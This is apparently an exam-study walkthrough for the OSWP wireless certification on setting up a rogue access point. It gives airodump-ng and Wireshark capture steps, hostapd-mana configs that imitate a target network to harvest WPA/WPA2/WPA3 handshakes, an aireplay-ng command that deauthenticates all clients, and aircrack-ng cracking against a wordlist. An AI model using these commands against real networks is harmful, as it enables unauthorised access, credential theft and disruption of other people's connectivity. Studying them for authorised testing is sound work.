---
{"dg-publish":true,"permalink":"/OSWP/f. Rouge APs/"}
---

---------
### Walkthrough:
1. Set up capture:
```
sudo airodump-ng -w discovery --output-format pcap wlan0mon
```
2. Open capture file in Wireshark
3. Filter for beacons:
```
wlan.fc.type_subtype == 0x08 wlan.ssid == "<name>"
```
4. Open "Tagged parameters"
5. Create a .conf file for hostapd-mana according to data:
```
interface=wlan0
ssid=<name>
channel=1
hw_mode=g #change to a for 5GHz
ieee80211n=1
wpa=3 #3 for both wpa/wpa2, 2 for wpa2 only, 1 for wpa only
wpa_key_mgmt=WPA-PSK
wpa_passphrase=ANYPASSWORD
wpa_pairwise=TKIP CCMP #wpa encryption setting
rsn_pairwise=TKIP CCMP #wpa2 encryption setting
mana_wpaout=<outfile>.hccapx
```
6. Start the AP:
```
sudo hostapd-mana file.conf
```
7. If necessary deauth all clients with a new wireless card:
```
sudo aireplay-ng -0 0 -a FC:7A:2B:88:63:EF wlan1mon
```
8. Crack the hashes with hashcat or aircrack:
```
aircrack-ng mostar.hccapx -e Mostar -w /usr/share/john/password.lst
```

------
### WPA-3 conf:
```
interface=wlan0
ssid=<name>
channel=1
hw_mode=g #change to a for 5GHz
ieee80211w=1
wpa=2
wpa_key_mgmt=WPA-PSK-SHA256
wpa_passphrase=ANYPASSWORD
rsn_pairwise=CCMP
mana_wpaout=<outfile>.hccapx
```

### Alternative: Probe requests
Wireshark filter:
```
wlan.fc.type_subtype == 4 or wlan.fc.type_subtype == 5
```